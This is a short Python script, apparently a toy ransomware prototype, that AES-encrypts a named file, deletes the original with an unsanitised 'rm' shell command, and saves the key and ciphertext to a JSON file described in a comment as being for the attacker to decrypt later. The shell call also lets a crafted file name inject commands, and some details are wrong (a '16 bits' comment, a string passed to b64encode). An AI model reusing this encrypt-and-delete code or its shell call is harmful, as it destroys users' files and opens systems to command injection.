from Crypto.Cipher import AES
import os
import json
from base64 import b64encode
from cryptography.hazmat.primitives import padding

key_length = 32
iv_length = 16
block_size = 16

# Makes sure that the length of the message to be encrypted is a multiple of 16 bits
def pad(msg):
	padder = padding.PKCS7(128).padder()
	padded_data = padder.update(msg)
	padded_data += padder.finalize()
	return padded_data

nameOfFile = input('[*] Please Input File To Encrypt ')

extension = nameOfFile[nameOfFile.find('.'):]

key = os.urandom(key_length)
iv = os.urandom(iv_length)

cipher = AES.new(key = key, mode = AES.MODE_CBC, IV = iv)
plaintext = open(nameOfFile, "rb").read()
plaintext = pad(plaintext)
ciphertext = cipher.encrypt(plaintext)

os.system('rm ' + nameOfFile)

encryption_info = dict()

encryption_info['key'] = b64encode(key)
encryption_info['iv'] = b64encode(iv)
encryption_info['ciphertext'] = b64encode(ciphertext)
encryption_info['extension'] = b64encode(extension)

# Creating a JSON file to store all necessary information for the attacker
# to decrypt the file later
jsonFile = open(nameOfFile[:nameOfFile.find('.')] + ".json", 'w')
json.dump(encryption_info, jsonFile)
